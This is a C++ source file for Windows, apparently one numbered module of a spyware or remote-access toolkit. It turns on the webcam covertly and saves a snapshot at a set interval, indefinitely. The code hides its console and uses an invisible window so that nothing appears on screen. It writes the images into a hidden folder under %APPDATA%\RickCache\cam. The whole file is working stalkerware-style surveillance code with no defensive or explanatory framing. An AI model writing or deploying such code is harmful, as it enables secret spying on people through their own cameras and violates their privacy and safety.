// language: C++17, file: src/tools/08_webcam.cpp, target: Windows 10/11, MSVC/MinGW
// Webcam snapshot - VFW (avicap32), BMP periodique, fenetre message-only invisible
// Usage: webcam.exe [interval_sec]   (defaut 30)
// MinGW: g++ -O2 -std=c++17 08_webcam.cpp -o cam.exe -lavicap32
#include <windows.h>
#include <cstdio>
#include <ctime>
#include <string>

#pragma comment(lib, "avicap32.lib")

// constantes VFW (vfw.h)
#define WM_CAP_START             (WM_USER)        // 0x0400
#define WM_CAP_DRIVER_CONNECT    (WM_CAP_START + 10)
#define WM_CAP_DRIVER_DISCONNECT (WM_CAP_START + 11)
#define WM_CAP_FILE_SAVEDIB      (WM_CAP_START + 25)
#define WM_CAP_GRAB_FRAME        (WM_CAP_START + 60)

typedef HWND (WINAPI *CapCreateW)(LPCWSTR, DWORD, int, int, int, int, HWND, int);

static std::string OutDir() {
    char path[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", path, MAX_PATH);
    strcat_s(path, "\\RickCache");
    CreateDirectoryA(path, NULL);
    strcat_s(path, "\\cam");
    CreateDirectoryA(path, NULL);
    SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN);
    return path;
}

int main(int argc, char** argv) {
    FreeConsole();
    int interval = argc > 1 ? atoi(argv[1]) : 30;

    HMODULE vfw = LoadLibraryA("avicap32.dll");
    if (!vfw) return 1;
    CapCreateW capCreate = (CapCreateW)GetProcAddress(vfw, "capCreateCaptureWindowW");
    if (!capCreate) return 2;

    // fenetre parente invisible : la capture ne doit rien montrer a l'ecran
    HWND parent = CreateWindowExA(0, "STATIC", "", 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
    HWND cap = capCreate(L"cap", WS_CHILD, 0, 0, 640, 480, parent, 0);

    if (!SendMessage(cap, WM_CAP_DRIVER_CONNECT, 0, 0)) {
        DestroyWindow(cap); DestroyWindow(parent);
        return 3; // pas de webcam / driver bloque
    }
    // premiere frame jetee: beaucoup de drivers sortent du noir au boot
    SendMessage(cap, WM_CAP_GRAB_FRAME, 0, 0);
    Sleep(1000);

    std::string dir = OutDir();
    for (;;) {
        SendMessage(cap, WM_CAP_GRAB_FRAME, 0, 0);
        char ts[32]; time_t t = time(nullptr);
        tm lt; localtime_s(&lt, &t);
        strftime(ts, sizeof(ts), "%Y%m%d_%H%M%S", &lt);
        std::string file = dir + "\\cam_" + ts + ".bmp";
        SendMessageA(cap, WM_CAP_FILE_SAVEDIB, 0, (LPARAM)file.c_str());
        if (interval < 1) interval = 1;
        Sleep(interval * 1000);
    }
    SendMessage(cap, WM_CAP_DRIVER_DISCONNECT, 0, 0);
    DestroyWindow(cap);
    DestroyWindow(parent);
    return 0;
}
